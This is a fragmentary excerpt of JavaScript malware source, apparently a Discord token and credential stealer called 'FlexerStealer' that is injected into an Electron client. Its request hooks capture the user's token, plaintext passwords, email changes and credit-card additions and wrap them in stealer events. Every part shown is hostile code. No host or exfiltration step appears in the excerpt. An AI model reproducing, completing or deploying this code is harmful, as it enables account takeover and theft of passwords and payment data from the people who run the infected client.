...
async function firstTime() {
  ...
  if (!fs.existsSync(path.join(__dirname, "FlexerStealerBTW"))) return true

  fs.rmdirSync(path.join(__dirname, "FlexerStealerBTW"));
...
session.defaultSession.webRequest.onCompleted(Filters[1], async (details, callback) => {
  ...
  switch (true) {
      case details.url.endsWith('login'):
          var event = new FlexerStealerEvent('userLogin', token, {
      ...
      case details.url.endsWith('users/@me') && details.method == 'PATCH':
          ...
          if (data.email) {
              var event = new FlexerStealerEvent('emailChanged', token, {
                  password: data.password,
                  email: data.email
              });
              event.handle();
          ...
          if (data.new_password) {
              var event = new FlexerStealerEvent('passwordChanged', token, {
                  password: data.password,
      ...
      case details.url.endsWith('tokens') && details.method == "POST":
          ...
          var event = new FlexerStealerEvent('creditCardAdded', token, {
